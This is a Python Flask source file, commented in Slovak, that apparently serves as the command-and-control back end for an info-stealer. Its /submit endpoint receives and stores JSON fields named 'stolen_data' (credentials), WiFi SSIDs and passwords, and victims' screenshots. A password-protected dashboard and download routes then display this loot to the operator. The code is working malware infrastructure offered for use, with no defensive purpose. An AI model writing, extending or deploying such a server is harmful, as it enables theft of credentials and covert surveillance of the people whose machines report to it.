from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
from functools import wraps
import os
import json
from datetime import datetime
from io import BytesIO
import base64

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supertajnykluc123")
DATA_FILE = "data.json"

def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- Upravený endpoint na prijímanie dát ---
@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.json
    if not data:
        return jsonify({"error": "No JSON data received"}), 400

    # Pridáme čas prijatia
    data['received_at'] = datetime.utcnow().isoformat() + "Z"

    # --- SPRACOVANIE NOVÝCH DÁT ---
    # Táto časť zabezpečí, že údaje sú v štruktúre, ktorú vie dashboard zobraziť.
    
    # 1. Skontrolujeme, či existuje nové pole 'stolen_data'
    if 'stolen_data' in data and isinstance(data['stolen_data'], list):
        # Ak áno, predpokladáme, že je to nový formát skriptu.
        # Dáta už sú v správnom formáte, nemusíme nič meniť.
        pass # Nič nerobiť, 'data' je už v poriadku.
    else:
        # Ak pole 'stolen_data' neexistuje, je to buď starý formát,
        # alebo sa nepodarilo získať žiadne poverenia.
        # Pre konzistenciu vytvoríme prázdne pole, aby sa nerozbil dashboard.
        data['stolen_data'] = []

    # 2. Zabezpečíme, aby existovali aj nové WiFi polia, aj keď sú prázdne
    if 'wifi_ssid' not in data:
        data['wifi_ssid'] = None
    if 'wifi_password' not in data:
        data['wifi_password'] = None

    # Uložíme spracované dáta
    current_data = load_data()
    current_data.append(data)
    save_data(current_data)
    
    return jsonify({"status": "ok"}), 200

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Prihlasovacie údaje (u-Admin / 120202810428Jm!)
        if username == 'u-Admin' and password == '120202810428Jm!':
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            error = "Nesprávne meno alebo heslo"
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    data = load_data()
    # Najnovšie dáta hore
    data = sorted(data, key=lambda x: x.get('received_at', ''), reverse=True)
    return render_template('dashboard.html', data=data)

@app.route('/detail/<int:index>')
@login_required
def detail(index):
    data = load_data()
    if index < 0 or index >= len(data):
        return "Not found", 404
    entry = data[index]
    return render_template('dashboard_alt.html', entry=entry, index=index)

@app.route('/screenshot/<int:index>')
@login_required
def screenshot(index):
    data = load_data()
    if index < 0 or index >= len(data):
        return "Not found", 404
    entry = data[index]
    b64 = entry.get('screenshot')
    if not b64:
        return "No screenshot", 404
    img_bytes = base64.b64decode(b64)
    return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")

if __name__ == '__main__':
    # Na produkciu nastav debug=False a použij gunicorn
    app.run(host='0.0.0.0', port=5000, debug=True)
